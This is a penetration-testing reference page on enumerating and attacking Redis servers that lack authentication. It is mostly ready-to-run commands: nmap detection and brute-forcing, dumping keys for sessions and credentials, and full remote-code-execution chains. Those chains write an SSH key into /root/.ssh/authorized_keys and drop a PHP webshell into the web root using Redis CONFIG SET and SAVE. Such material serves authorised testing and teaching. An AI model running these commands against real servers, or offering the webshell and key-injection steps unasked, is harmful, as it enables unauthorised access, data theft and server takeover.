% Filename: 02-reconnaissance/enum-database/redis.md
% Display name: Redis Enumeration
% Last update: 2026-02-09
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# Redis Enumeration

## Overview

Redis runs on TCP 6379 by default. It is an in-memory key-value store frequently deployed without authentication. Enumeration targets version detection, unauthenticated access testing, data extraction, and file write capabilities. Redis exposed to the network with no authentication is a critical finding — it provides direct data access and can be leveraged for remote code execution via SSH key injection, webshell writing, or module loading.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target TCP 6379
- `redis-cli` or Nmap installed

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 6379 <target>
```

Expected output:
```text
6379/tcp open  redis  Redis key-value store 7.0.11
```

### Nmap NSE Scripts

```bash
# Nmap
# https://nmap.org/
# Server info (version, OS, memory, clients)
nmap -p 6379 --script redis-info <target>

# Brute-force
nmap -p 6379 --script redis-brute <target>
```

### redis-cli Connection

```bash
# Redis CLI
# https://redis.io/
# Test unauthenticated access
redis-cli -h <target> ping
```

Expected output on success:
```text
PONG
```

If `PONG` is returned, no authentication is required — the server is fully accessible.

```bash
# Redis CLI
# https://redis.io/
# Authenticated connection
redis-cli -h <target> -a <password>
```

### Server Enumeration

```bash
# Redis CLI
# https://redis.io/
# Server info (version, OS, memory, connected clients)
redis-cli -h <target> INFO server

# All info sections
redis-cli -h <target> INFO

# Configuration
redis-cli -h <target> CONFIG GET *

# List databases and key counts
redis-cli -h <target> INFO keyspace

# Check authentication status
redis-cli -h <target> CONFIG GET requirepass
```

Key info sections:
- `INFO server` — Redis version, OS, architecture, PID
- `INFO clients` — connected clients count
- `INFO memory` — memory usage
- `INFO keyspace` — database count and key counts per database

### Data Extraction

```bash
# Redis CLI
# https://redis.io/
# List all keys in current database (avoid on production — blocks server)
redis-cli -h <target> KEYS *

# Select database (default: 0)
redis-cli -h <target> SELECT 1
redis-cli -h <target> -n 1 KEYS *

# Get value by key
redis-cli -h <target> GET <key>

# Get key type
redis-cli -h <target> TYPE <key>

# Dump hash (if type is hash)
redis-cli -h <target> HGETALL <key>

# Dump list
redis-cli -h <target> LRANGE <key> 0 -1

# Dump set
redis-cli -h <target> SMEMBERS <key>

# Scan keys (non-blocking alternative to KEYS)
redis-cli -h <target> SCAN 0
```

Look for keys containing sessions, tokens, credentials, or cached user data. Common patterns: `session:*`, `user:*`, `token:*`, `auth:*`.

### File Write via Config Manipulation

If Redis is running as a privileged user (often `redis` or `root`) and authentication is disabled, the `CONFIG SET` commands can write arbitrary files:

```bash
# Redis CLI
# https://redis.io/
# SSH key injection
# Generate an SSH key pair
ssh-keygen -t ed25519 -f redis_key -N ''

# Prepare payload with padding (Redis adds protocol junk around the value)
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt

# Write to Redis
cat payload.txt | redis-cli -h <target> -x set sshkey

# Set the dump directory and filename
redis-cli -h <target> CONFIG SET dir /root/.ssh/
redis-cli -h <target> CONFIG SET dbfilename authorized_keys
redis-cli -h <target> SAVE

# Connect
ssh -i redis_key root@<target>
```

```bash
# Redis CLI
# https://redis.io/
# Webshell write (if web root is known)
redis-cli -h <target> CONFIG SET dir /var/www/html/
redis-cli -h <target> CONFIG SET dbfilename shell.php
redis-cli -h <target> SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h <target> SAVE
```

These techniques work because `SAVE` dumps the entire database to the configured file path. The file contains Redis format data, but embedded strings (like SSH keys or PHP code) remain functional.

### Protected Mode

Redis 3.2+ has protected mode enabled by default — if no password is set and the server is not bound to localhost, it rejects external connections:

```bash
# Redis CLI
# https://redis.io/
# Check protected mode
redis-cli -h <target> CONFIG GET protected-mode
```

If protected mode is off and no password is set, the server is fully exposed.

## Post-Enumeration

With Redis access, prioritize:
- Data extraction — session tokens, cached credentials, API keys
- SSH key injection for direct shell access (if running as root or a user with SSH)
- Webshell writing if the web root path is known
- Credential reuse — Redis passwords are often reused across services
- Check which user Redis runs as (`INFO server` shows `process_id`, check `/proc/<pid>/status`)

## References

### Official Documentation

- [Redis Official Documentation](https://redis.io/docs/)
- [Nmap redis-info NSE Script](https://nmap.org/nsedoc/scripts/redis-info.html)
- [Nmap redis-brute NSE Script](https://nmap.org/nsedoc/scripts/redis-brute.html)

### Pentest Guides & Research

- [Redis Security — Official Guidance](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)
- [HackTricks — Redis Pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)

### MITRE ATT&CK

- [T1595 — Active Scanning](https://attack.mitre.org/techniques/T1595/)
- [T1021.004 — Remote Services: SSH](https://attack.mitre.org/techniques/T1021/004/)
- [T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
